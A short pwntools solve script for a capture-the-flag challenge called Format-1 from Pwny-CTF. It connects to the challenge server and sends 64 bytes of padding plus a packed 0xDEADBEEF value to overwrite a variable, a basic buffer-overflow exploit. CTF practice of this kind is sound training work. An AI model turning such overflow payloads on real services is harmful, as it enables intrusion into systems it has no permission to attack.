# Format-1 — Pwny-CTF (script de solve)
from pwn import *

io = remote("chal.sigpwny.com", 1339)
context.log_level = "debug"

payload = b"b" * 64 + p32(0xDEADBEEF)
io.sendline(payload)

res = io.recvall(timeout=2)
print(res.decode())
